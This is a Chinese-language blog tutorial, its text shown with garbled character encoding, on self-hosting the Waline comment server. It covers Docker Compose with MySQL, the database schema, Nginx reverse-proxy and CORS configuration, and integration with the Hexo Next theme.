åç«¯è¯„è®ºç³»ç»Ÿï¼Œç”¨æˆ·æ— éœ€ç™»å½•å³å¯è¯„è®ºï¼Œç›®å‰å·²æœ‰ Hexoã€Jekyllã€Typechoã€Hugoã€Ghost ç­‰åšå®¢ç¨‹åºåœ¨ä½¿ç”¨ã€‚ç”±äº Valine è‡ªèº«ä¸æ”¯æŒé‚®ä»¶é€šçŸ¥æ”¯æŒï¼Œå› æ­¤è¯ç”Ÿäº† Valine Admin å¼€æºé¡¹ç›®ï¼›ä¸€ä¸ªå¯¹ Valine è¯„è®ºç³»ç»Ÿçš„æ‹“å±•åº”ç”¨ï¼Œå¯å¢å¼º Valine çš„é‚®ä»¶é€šçŸ¥åŠŸèƒ½ï¼›åŸºäº Leancloud çš„äº‘å¼•æ“ä¸äº‘å‡½æ•°ï¼Œä¸»è¦å®ç°è¯„è®ºé‚®ä»¶é€šçŸ¥ã€è¯„è®ºç®¡ç†ã€è‡ªå®šä¹‰é‚®ä»¶é€šçŸ¥æ¨¡æ¿ç­‰åŠŸèƒ½ï¼Œè€Œä¸”è¿˜å¯ä»¥æä¾›é‚®ä»¶ é€šçŸ¥åšä¸» å’Œ @ é€šçŸ¥ çš„åŠŸèƒ½ã€‚ Waline è¯„è®ºç³»ç»ŸWaline ä¸€æ¬¾ä» Valine è¡ç”Ÿçš„å¸¦åç«¯è¯„è®ºç³»ç»Ÿï¼Œå¯ä»¥å°† Waline ç­‰ä»·æˆ With backend Valineï¼Œé‡‡ç”¨ Client/Server æ¶æ„å¹¶åŸºäº NodeJS å¼€å‘ã€‚Valine æ”¯æŒ MarkDown è¯­æ³•ã€é‚®ä»¶é€šçŸ¥ã€è¯„è®ºç®¡ç†ã€å¤šç§éƒ¨ç½²æ–¹å¼ã€å¤šç§æ•°æ®å­˜å‚¨æ–¹å¼ã€‚ Waline å®¢æˆ·ç«¯è„šæœ¬ æœåŠ¡ç«¯éƒ¨ç½² æ•°æ®å­˜å‚¨ @waline/client Vercel LeanCloud MiniValine CloudBase CloudBase Docker MongoDB ç‹¬ç«‹éƒ¨ç½² MySQL SQLite PostgreSQL Github Waline æ”¯æŒçš„åŠŸèƒ½ï¼š é‚®ä»¶é€šçŸ¥ å¾®ä¿¡é€šçŸ¥ QQ é€šçŸ¥ Telegram é€šçŸ¥ Akismet ååƒåœ¾è¯„è®º æ–‡ç« ç»Ÿè®¡ å¤šè¯­è¨€ è‡ªå®šä¹‰è¯­è¨€æ”¯æŒ ç™»å½•æ”¯æŒ è¯„è®ºç®¡ç† è¯„è®ºåˆ é™¤ å…¶å®ƒæ•°æ®åº“æœåŠ¡æ”¯æŒï¼ˆå·²æ”¯æŒ LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL) åŸºäº IP çš„è¯„è®ºå‘å¸ƒé¢‘ç‡é™åˆ¶ åŸºäºå…³é”®è¯çš„è¯„è®ºè¿‡æ»¤é™åˆ¶ IP é»‘åå• é‡å¤å†…å®¹æ£€æµ‹ CloudBase è…¾è®¯äº‘å¼€å‘éƒ¨ç½²æ”¯æŒ ç¤¾äº¤ç™»å½• AWS, GCP, Azure éƒ¨ç½²æ”¯æŒ ç½®é¡¶è¯„è®º è¯„è®ºèµè¸© Docker éƒ¨ç½² MySQL Serverä½¿ç”¨ Docker éƒ¨ç½² MySQLï¼Œå®¹å™¨ç®¡ç†å·¥å…·ä½¿ç”¨ Docker-Composeã€‚ Doker éƒ¨ç½² MySQLåœ¨ä¸‹è¿°çš„ Docker-Compose é…ç½®é‡Œï¼ŒæŒ‡å®šäº† MySQL å®¹å™¨çš„é™æ€ IP åœ°å€ä¸ç³»ç»Ÿæ—¶åŒºï¼ŒyourPassword ä¸ºæ•°æ®åº“å¯†ç ï¼Œ/usr/local/docker-volumes/mysql/* æ˜¯ MySQL å®¹å™¨å„ä¸ªæ•°æ®å·ç›®å½•çš„è·¯å¾„ 1234567891011121314151617181920212223242526272829version: "3.5"services: mysql: image: mysql:5.7.26 container_name: waline-mysql restart: always privileged: false environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: yourPassword ports: - 3306:3306 networks: waline-network: ipv4_address: 172.23.0.3 volumes: - \'/usr/local/docker-volumes/mysql/conf:/etc/mysql/conf.d\' - \'/usr/local/docker-volumes/mysql/data:/var/lib/mysql\' - \'/usr/local/docker-volumes/mysql/log:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_passwordnetworks: waline-network: name: waline-network driver: bridge ipam: config: - subnet: 172.23.0.0/24 MySQL æ•°æ®åº“è¡¨åˆå§‹åŒ–åˆ›å»ºå¹¶å¯åŠ¨ MySQL çš„ Docker å®¹å™¨åï¼Œå¯¼å…¥æœ€æ–°çš„ waline.sql è„šæœ¬æ¥åˆ›å»ºå¥½ Waline Server æ‰€éœ€çš„æ•°æ®åº“è¡¨ï¼Œå…¶ä¸­ç›¸å…³è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152CREATE DATABASE waline DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `wl_Comment` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `user_id` int(11) DEFAULT NULL, `comment` text, `insertedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `ip` varchar(100) DEFAULT \'\', `link` varchar(255) DEFAULT NULL, `mail` varchar(255) DEFAULT NULL, `nick` varchar(255) DEFAULT NULL, `pid` int(11) DEFAULT NULL, `rid` int(11) DEFAULT NULL, `sticky` boolean DEFAULT NULL, `status` varchar(50) NOT NULL DEFAULT \'\', `like` int(11) DEFAULT NULL, `ua` text, `url` varchar(255) DEFAULT NULL, `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `wl_Counter` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `time` int(11) DEFAULT NULL, `url` varchar(255) NOT NULL DEFAULT \'\', `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `wl_Users` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `display_name` varchar(255) NOT NULL DEFAULT \'\', `email` varchar(255) NOT NULL DEFAULT \'\', `password` varchar(255) NOT NULL DEFAULT \'\', `type` varchar(50) NOT NULL DEFAULT \'\', `label` varchar(255) DEFAULT NULL, `url` varchar(255) DEFAULT NULL, `avatar` varchar(255) DEFAULT NULL, `github` varchar(255) DEFAULT NULL, `twitter` varchar(255) DEFAULT NULL, `facebook` varchar(255) DEFAULT NULL, `google` varchar(255) DEFAULT NULL, `weibo` varchar(255) DEFAULT NULL, `qq` varchar(255) DEFAULT NULL, `2fa` varchar(32) DEFAULT NULL, `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; Docker éƒ¨ç½² Waline Serverä½¿ç”¨ Docker éƒ¨ç½² Waline Serverï¼Œæ•°æ®å­˜å‚¨æ–¹å¼é€‰æ‹© MySQLï¼Œå®¹å™¨ç®¡ç†å·¥å…·ä½¿ç”¨ Docker-Composeã€‚ æ„å»º Waline Server é•œåƒè‹¥ä¸å¸Œæœ›è‡ªå·±æ„å»º Waline Server çš„ Docker é•œåƒï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ Waline å®˜æ–¹çš„ Docker é•œåƒï¼Œæ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š 12345678# æ‹‰å–æœ€æ–°çš„ä»£ç # git clone https://github.com/lizheming/waline.git# è¿›å…¥ä»£ç ç›®å½•# cd waline/packages/server/# æ„å»ºé•œåƒ# docker build -t lizheming/waline -f Dockerfile . å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå®˜æ–¹æä¾›çš„ Dockerfile é»˜è®¤ä¼šä½¿ç”¨æœ€æ–°çš„ Waline Server ä»£ç æ¥æ„å»º Docker é•œåƒï¼Œè‹¥å¸Œæœ›ä½¿ç”¨æœ¬åœ°çš„ Waline Server ä»£ç ï¼ˆç»è¿‡æ›´æ”¹çš„ï¼‰æ¥æ„å»º Docker é•œåƒï¼Œéœ€è¦è‡ªè¡Œæ›´æ”¹ Dockerfile çš„å†…å®¹ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼›ä¸ºäº†ç»Ÿä¸€ä½¿ç”¨ä¸œå…«åŒºæ—¶åŒºï¼Œå»ºè®®æ›´æ”¹ç³»ç»Ÿé»˜è®¤çš„æ—¶åŒºã€‚ 12345678910111213141516171819# https://github.com/nodejs/LTSFROM node:lts AS buildWORKDIR /appENV NODE_ENV productionRUN set -eux; \\ # npm config set registry https://registry.npmmirror.com; \\ npm install --production --silent @waline/vercel# use local source codeRUN rm -rf /app/node_modules/@waline/vercel/src/*COPY ./src/ /app/node_modules/@waline/vercel/srcFROM node:lts-buster-slimWORKDIR /appRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeENV TZ Asia/ShanghaiENV NODE_ENV productionCOPY --from=build /app .EXPOSE 8360CMD ["node", "node_modules/@waline/vercel/vanilla.js"] æç¤º è‹¥æ„å»º Waline Server çš„ Docker é•œåƒæ—¶ï¼Œä¸€ç›´å¡åœ¨ NPM å®‰è£…æ¨¡å—çš„è¿‡ç¨‹é‡Œï¼Œå¯ä»¥æ›´æ”¹å¯¹åº”çš„ Dockerfileï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œä½¿ç”¨æ·˜å®çš„ NPM æºæ¥åŠ é€Ÿ NPM æ¨¡å—ä¸‹è½½ 123456$ vim waline/packages/server/Dockerfile...ï¼ˆçœç•¥ï¼‰npm config set registry https://registry.npmmirror.com; \\npm install --production --silent @waline/vercel...ï¼ˆçœç•¥ï¼‰ Docker éƒ¨ç½² Waline Serveråœ¨ä¸Šé¢ MySQL çš„ Docker-Compose é…ç½®åŸºç¡€ä¸Šï¼ŒæŒ‡å®š Waline Server å®¹å™¨çš„é™æ€ IP åœ°å€ ä¸ Waline Server å¯åŠ¨æ—¶æ‰€éœ€çš„ç¯å¢ƒå˜é‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758version: "3.5"services: mysql: image: mysql:5.7.26 container_name: waline-mysql restart: always privileged: false environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: yourPassword ports: - 3306:3306 networks: waline-network: ipv4_address: 172.23.0.3 volumes: - \'/usr/local/docker-volumes/mysql/conf:/etc/mysql/conf.d\' - \'/usr/local/docker-volumes/mysql/data:/var/lib/mysql\' - \'/usr/local/docker-volumes/mysql/log:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_password waline: container_name: waline image: lizheming/waline:latest restart: always privileged: false depends_on: - mysql ports: - 8360:8360 networks: waline-network: ipv4_address: 172.23.0.4 environment: TZ: "Asia/Shanghai" AKISMET_KEY: "false" DISABLE_USERAGENT: "true" SITE_NAME: "Your site name" SECURE_DOMAINS: "example.cn" AUTHOR_EMAIL: "example@qq.com" SITE_URL: "https://www.example.cn" MYSQL_HOST: 172.23.0.3 MYSQL_PORT: 3306 MYSQL_DB: waline MYSQL_PREFIX: wl_ MYSQL_USER: root MYSQL_PASSWORD: yourPassword volumes: - /usr/local/waline/data:/app/datanetworks: waline-network: name: waline-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Waline Server çš„ç¯å¢ƒå˜é‡Waline Server çš„ è‡ªèº«ç¯å¢ƒå˜é‡å¦‚ä¸‹ï¼š ç¯å¢ƒå˜é‡åç§° å¿…å¡« é»˜è®¤å€¼ å¤‡æ³¨ TZ æ—¶åŒº SITE_URL ç«™ç‚¹ URL SITE_NAME ç«™ç‚¹åç§° AUTHOR_EMAIL åšä¸»é‚®ç®± SECURE_DOMAINS å®‰å…¨åŸŸåé…ç½®ï¼Œæ”¯æŒé€—å·åˆ†éš”é…ç½®å¤šä¸ªåŸŸåï¼Œé…ç½®åéè¯¥åŸŸåæ¥æºçš„è¯·æ±‚ä¼šè¿”å› 403 çŠ¶æ€ç ï¼Œä¸é…ç½®è¡¨ç¤ºå…è®¸æ‰€æœ‰åŸŸåæ¥æº IPQPS 60 åŸºäº IP çš„è¯„è®ºå‘å¸ƒé¢‘ç‡é™åˆ¶ï¼Œå•ä½ä¸ºç§’ã€‚é»˜è®¤ä¸º 60 ç§’ï¼Œè®¾ç½®ä¸º 0 ä¸é™åˆ¶ DISABLE_USERAGENT false æ˜¯å¦éšè—è¯„è®ºè€…çš„ UAï¼Œé»˜è®¤ä¸ºå¦ DISABLE_REGION false æ˜¯å¦éšè—è¯„è®ºè€…çš„å½’å±åœ°ï¼Œé»˜è®¤ä¸ºå¦ DISABLE_AUTHOR_NOTIFY false æ˜¯å¦ç¦æ­¢æ–°è¯„è®ºé€šçŸ¥ï¼Œé»˜è®¤ä¸ºå¦ COMMENT_AUDIT è¯„è®ºå‘å¸ƒå®¡æ ¸å¼€å…³ï¼Œé»˜è®¤ä¸ºå¦ï¼Œé…ç½®åå»ºè®®åœ¨ Placehoder ä¸Šæä¾›æ–‡æ¡ˆæç¤º AKISMET_KEY Akismet ååƒåœ¾è¯„è®ºæœåŠ¡çš„ Keyï¼ˆé»˜è®¤å¼€å¯ï¼Œä¸ç”¨è¯·è®¾ç½®ä¸º falseï¼Œå…³é—­åå¯ä»¥åŠ å¿«è¯„è®ºæäº¤çš„é€Ÿåº¦ï¼‰ AVATAR_PROXY https://avatar.75cdn.workers.dev/ å¤´åƒçš„ä»£ç†åœ°å€ï¼Œè®¾ç½® false å¯ä»¥å…³é—­ä»£ç† LOGIN å½“è®¾ç½®ä¸º LOGIN: \'force\' æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè¦æ±‚å®¢æˆ·ç«¯å¿…é¡»ç™»å½•æ‰èƒ½è¯„è®ºï¼›åŒæ—¶ Waline å®¢æˆ·ç«¯éœ€è¦å¢åŠ  loginï¼š force çš„é…ç½®ç”¨äºéšè—åšå®¢é¡µé¢ä¸Šçš„è¯„è®ºåŒ¿åè¾“å…¥æ¡† GRAVATAR_STR https://seccdn.libravatar.org/avatar/{{mail|md5}} Gravatar å¤´åƒçš„åœ°å€ï¼ŒåŸºäº Nunjucks è¯­æ³• OAUTH_URL https://user.75.team OAuth ç¬¬ä¸‰æ–¹ç™»å½•æœåŠ¡åœ°å€ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ auth è‡ªå»º WEBHOOK è¯„è®ºæˆåŠŸåä¼šå‘ WEBHOOK é…ç½®çš„åœ°å€å‘é€ä¸€æ¡ POST è¯·æ±‚ COMMENT_AUDITï¼šé˜…è¯»æºä»£ç å‘ç°ï¼Œç¯å¢ƒå˜é‡ä¸­ä¸é…ç½® COMMENT_AUDITï¼Œåˆ™é»˜è®¤å…³é—­è¯„è®ºå‘å¸ƒçš„å®¡æ ¸åŠŸèƒ½ï¼Œåªè¦åœ¨ç¯å¢ƒå˜é‡ä¸­æ·»åŠ äº†è¯¥å±æ€§ï¼Œæ— è®ºå±æ€§å€¼æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå¼€å¯è¯„è®ºå‘å¸ƒçš„å®¡æ ¸åŠŸèƒ½ Waline Server çš„ MySQL ç¯å¢ƒå˜é‡å¦‚ä¸‹ï¼š ç¯å¢ƒå˜é‡åç§° å¿…å¡« é»˜è®¤å€¼ å¤‡æ³¨ MYSQL_HOST 127.0.0.1 MySQL æœåŠ¡çš„åœ°å€ MYSQL_PORT 3306 MySQL æœåŠ¡çš„ç«¯å£ MYSQL_DB âœ“ MySQL æ•°æ®åº“åº“å MYSQL_USER âœ“ MySQL æ•°æ®åº“çš„ç”¨æˆ·å MYSQL_PASSWORD âœ“ MySQL æ•°æ®åº“çš„å¯†ç  MYSQL_PREFIX wl_ MySQL æ•°æ®è¡¨çš„è¡¨å‰ç¼€ MYSQL_CHARSET utf8mb4 MySQL æ•°æ®è¡¨çš„å­—ç¬¦é›† Waline Server è¿è¡Œæµ‹è¯•åˆ†åˆ«åˆ›å»ºå¹¶å¯åŠ¨ MySQL ä¸ Waline Server å®¹å™¨ï¼Œç„¶åæµè§ˆå™¨è®¿é—® http://ip:port/ui/registerï¼Œæ‰“å¼€ Waline Server çš„ Web ç®¡ç†ç•Œé¢è¿›è¡Œæ³¨å†Œï¼Œç¬¬ä¸€ä¸ªæ³¨å†Œçš„ç”¨æˆ·ä¼šè¢« Waline Server è¯†åˆ«ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼ˆåšä¸»ï¼‰ï¼ŒæˆåŠŸç™»å½•åçš„ç•Œé¢å¦‚ä¸‹ï¼š è‹¥ Waline Server çš„ Web ç®¡ç†ç•Œé¢æ— æ³•æ­£å¸¸è®¿é—®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ Docker å®¹å™¨çš„æ—¥å¿—æ¥å®šä½é—®é¢˜ 1# docker logs -f --tail 20 waline Waline Server é…ç½®åå‘ä»£ç†Nginx åå‘ä»£ç†é…ç½®è‹¥ä½¿ç”¨ Nginx ä½œä¸º Waline Server çš„åå‘ä»£ç†ï¼Œå¯å‚è€ƒä»¥ä¸‹é…ç½®å†…å®¹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637server { listen 80; listen 443 ssl; server_name www.example.com if ($server_port !~ 443){ rewrite ^(/.*)$ https://$host$1 permanent; } # SSL è¯ä¹¦ ssl_certificate /usr/local/nginx/cert/waline.example.com.crt; ssl_certificate_key /usr/local/nginx/cert/waline.example.com.key; # SSL æ€§èƒ½è°ƒä¼˜ ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; add_header Strict-Transport-Security \'max-age=31536000\'; location / { # åå‘ä»£ç† proxy_pass http://$server_name; proxy_set_header Host $host:$server_port; proxy_set_header X-NginX-Proxy true; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr; # ç¼“å­˜ add_header X-Cache $upstream_cache_status; add_header Cache-Control no-cache; expires 12h; }} Nginx é…ç½®è·¨åŸŸè®¿é—®é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“åœ¨ Waline æœåŠ¡ç«¯çš„ç¯å¢ƒå˜é‡é‡Œæ·»åŠ äº† SITE_URL å±æ€§ï¼Œé‚£ä¹ˆ Nginx çš„åå‘ä»£ç†ä¸å†éœ€è¦é…ç½®è·¨åŸŸï¼Œå› ä¸º Waline Server ä¼šè‡ªåŠ¨å°† SITE_URL æ·»åŠ åˆ°å…è®¸è·¨åŸŸçš„åå•é‡Œã€‚è‹¥ Waline Server è‡ªå¸¦çš„è·¨åŸŸé…ç½®ä¸èƒ½æ»¡è¶³è¦æ±‚ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å†…å®¹è‡ªè¡Œé…ç½® Nginx çš„è·¨åŸŸã€‚ 123456789101112131415161718192021222324252627location /comment { # æ¸…é™¤Walineè‡ªå¸¦çš„è·¨åŸŸHeader proxy_hide_header Access-Control-Allow-Origin; proxy_hide_header Access-Control-Allow-Methods; proxy_hide_header Access-Control-Allow-Headers; proxy_hide_header Access-Control-Allow-Credentials; # æ·»åŠ è‡ªå®šä¹‰çš„è·¨åŸŸHeader add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; # åå‘ä»£ç† proxy_pass http://$server_name; proxy_set_header Host $host:$server_port; proxy_set_header X-NginX-Proxy true; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr; # ç¼“å­˜ add_header X-Cache $upstream_cache_status; add_header Cache-Control no-cache; expires 12h;} (adsbygoogle = window.adsbygoogle || []).push({}); Next ä¸»é¢˜å®‰è£… Waline å®˜æ–¹æ’ä»¶å®‰è£… Waline å®˜æ–¹æ’ä»¶Waline å®˜æ–¹æ’ä»¶çš„ç‰ˆæœ¬å¿…é¡»ä¸ Next ä¸»é¢˜çš„ç‰ˆæœ¬åŒ¹é…ï¼Œå¦åˆ™ Waline å®˜æ–¹æ’ä»¶æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œä¸¤è€…çš„å…¼å®¹æ€§è¯´æ˜å¦‚ä¸‹ï¼š Next ä¸»é¢˜çš„ç‰ˆæœ¬ Waline å®˜æ–¹æ’ä»¶çš„ç‰ˆæœ¬ &lt;= 8.3.0 &lt;= 1.0.8 &gt;= 8.4.0 &gt;= 2.0.0 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd /blog-root# å®‰è£…Walineæ’ä»¶ï¼ˆé»˜è®¤æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼‰$ npm install @waline/hexo-next --save é…ç½® Waline å®˜æ–¹æ’ä»¶æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œå…¶ä¸­ serverURL æ˜¯ Waline Server çš„è®¿é—® URLï¼Œéœ€è¦è‡ªè¡Œæ›´æ”¹è¯¥å±æ€§çš„å€¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# Waline Config File# For more information:# - https://waline.js.org# - https://waline.js.org/reference/component.htmlwaline: # New! Whether enable this plugin enable: true # Waline server address url, you should set this to your own link serverURL: https://waline.vercel.app # Waline library CDN url, you can set this to your preferred CDN # libUrl: https://unpkg.com/@waline/client@v2/dist/waline.js # Waline CSS styles CDN url, you can set this to your preferred CDN cssUrl: https://unpkg.com/@waline/client@v2/dist/waline.css # Custom locales # locale: # placeholder: Welcome to comment # Comment box placeholder # If false, comment count will only be displayed in post page, not in home page commentCount: true # Pageviews count, Note: You should not enable both `waline.pageview` and `leancloud_visitors`. pageview: false # Custom emoji # emoji: # - https://unpkg.com/@waline/emojis@1.0.1/weibo # - https://unpkg.com/@waline/emojis@1.0.1/alus # - https://unpkg.com/@waline/emojis@1.0.1/bilibili # - https://unpkg.com/@waline/emojis@1.0.1/qq # - https://unpkg.com/@waline/emojis@1.0.1/tieba # - https://unpkg.com/@waline/emojis@1.0.1/tw-emoji # Comment infomation, valid meta are nick, mail and link # meta: # - nick # - mail # - link # Set required meta field, e.g.: [nick] | [nick, mail] # requiredMeta: # - nick # Language, available values: en-US, zh-CN, zh-TW, pt-BR, ru-RU, jp-JP # lang: zh-CN # Word limit, no limit when setting to 0 # wordLimit: 0 # Whether enable login, can choose from \'enable\', \'disable\' and \'force\' # login: enable # comment per page # pageSize: 10 æ›´æ”¹ Next ä¸»é¢˜çš„æ ·å¼ç”±äº Next ä¸»é¢˜é»˜è®¤å¯¹æ‰€æœ‰å›¾ç‰‡éƒ½æ·»åŠ äº† display: block; CSS æ ·å¼ï¼Œè¿™ä¼šå¯¼è‡´ Waline çš„è¡¨æƒ…åŒ…å›¾ç‰‡ç‹¬ç«‹ä¸€è¡Œæ˜¾ç¤ºï¼Œéœ€è¦å¾€ Next ä¸»é¢˜é‡Œæ·»åŠ ä»¥ä¸‹è‡ªå®šä¹‰æ ·å¼æ¥è§£å†³ï¼Œä¾‹å¦‚æ›´æ”¹æ ·å¼æ–‡ä»¶ themes/next/source/css/_common/scaffolding/base.styl 123.wl-content .vemoji, .wl-content .wl-emoji { display: inline !important;} Hexo æ„å»ºå¤±è´¥çš„è§£å†³æ–¹æ³•è‹¥ Next ä¸»é¢˜å®‰è£… Waline å®˜æ–¹æ’ä»¶åï¼Œæ‰§è¡Œ hexo g å‘½ä»¤æŠ›å‡ºä»¥ä¸‹å¼‚å¸¸ï¼Œè¿™æ˜¯ç”±äº Hexo æˆ–è€… Next çš„ç‰ˆæœ¬è¿‡ä½å¯¼è‡´ï¼Œæ­¤æ—¶éœ€è¦å‡çº§ Hexo æˆ–è€… Next çš„ç‰ˆæœ¬ 1234567891011121314151617181920212223ERROR Render HTML failed: index.htmlTypeError: Cannot read property \'parent\' of null at Function.exports.update (/usr/local/hexo/node_modules/cheerio/lib/parse.js:55:26) at module.exports (/usr/local/hexo/node_modules/cheerio/lib/parse.js:17:11) at Function.exports.load (/usr/local/hexo/node_modules/cheerio/lib/static.js:22:14) at Hexo.hexoMetaGeneratorInject (/usr/local/hexo/node_modules/hexo/lib/plugins/filter/meta_generator.js:8:21) at Hexo.tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo/node_modules/bluebird/js/release/method.js:15:34) at Promise.each.filter (/usr/local/hexo/node_modules/hexo/lib/extend/filter.js:60:50) at tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromiseCtx (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:641:10) at _drainQueueStep (/usr/local/hexo/node_modules/bluebird/js/release/async.js:97:12) at _drainQueue (/usr/local/hexo/node_modules/bluebird/js/release/async.js:86:9) at Async._drainQueues (/usr/local/hexo/node_modules/bluebird/js/release/async.js:102:5) at Immediate.Async.drainQueues [as _onImmediate] (/usr/local/hexo/node_modules/bluebird/js/release/async.js:15:14) at runCallback (timers.js:705:18) at tryOnImmediate (timers.js:676:5) at processImmediate (timers.js:658:5) Waline ç¬¬ä¸‰æ–¹æ’ä»¶åˆ—è¡¨hexo-waline-next hexo-waline-nextï¼Œä¸€æ¬¾æ›´å¼ºå¤§ä¸”é€‚ç”¨äº Next ä¸»é¢˜çš„ Waline æ’ä»¶ï¼Œæ”¯æŒä¸Šä¼ è¯„è®ºå›¾ç‰‡åˆ°ä¸ƒç‰›å›¾åºŠ hexo-next-darkmode hexo-next-darkmodeï¼Œä¸€æ¬¾é€‚ç”¨äº Waline ä¸ Next ä¸»é¢˜çš„æš—é»‘æ¨¡å¼åˆ‡æ¢æ’ä»¶ï¼Œè¯¦ç»†çš„ä½¿ç”¨è¯´æ˜è¯·çœ‹è¿™é‡Œ Waline è¿›é˜¶é…ç½®å®¢æˆ·ç«¯ä½¿ç”¨ CDNWaline å®¢æˆ·ç«¯è‹¥æƒ³ä½¿ç”¨ CDN åŠ é€Ÿï¼Œåªéœ€åœ¨ Next ä¸»é¢˜çš„ _config.yml é…ç½®æ–‡ä»¶ä¸­ï¼Œæ›´æ”¹ Waline å®˜æ–¹æ’ä»¶çš„é…ç½®ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰å³å¯ã€‚ç”±äº Waline é‡‡ç”¨ Client/Server æ¶æ„ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„ç‰ˆæœ¬ä¸€èˆ¬éœ€è¦åŒ¹é…æ‰èƒ½æ­£å¸¸è¿è¡Œï¼›å› æ­¤ä¸å»ºè®®æ¯æ¬¡è‡ªåŠ¨éƒ½è·å–æœ€æ–°ç‰ˆçš„å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè€Œæ˜¯æ¨èæ—¥åç»Ÿä¸€æ›´æ–°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„ç‰ˆæœ¬ã€‚ 123456789# è·å–æœ€æ–°ç‰ˆæœ¬çš„Walinewaline: libUrl: https://unpkg.com/@waline/client@v2/dist/waline.js cssUrl: https://unpkg.com/@waline/client@v2/dist/waline.css# è·å–æŒ‡å®šç‰ˆæœ¬çš„Walinewaline: libUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.js cssUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.css éªŒè¯ç”¨æˆ·æ³¨å†Œé‚®ç®±ç”¨æˆ·æ³¨å†Œå’Œè¯„è®ºçš„é‚®ä»¶é€šçŸ¥éƒ½ä¼šç”¨åˆ°é‚®ä»¶æœåŠ¡ï¼Œé…ç½®é‚®ä»¶æœåŠ¡ç›¸å…³å˜é‡åï¼Œç”¨æˆ·æ³¨å†Œæµç¨‹ä¼šå¢åŠ é‚®ç®±éªŒè¯ç ç¡®è®¤ç›¸å…³çš„æ“ä½œï¼Œç”¨æ¥é˜²æ­¢æ¶æ„çš„æ³¨å†Œã€‚ ç¯å¢ƒå˜é‡åç§° å¤‡æ³¨ SMTP_SERVICE SMTP é‚®ä»¶å‘é€æœåŠ¡æä¾›å•† 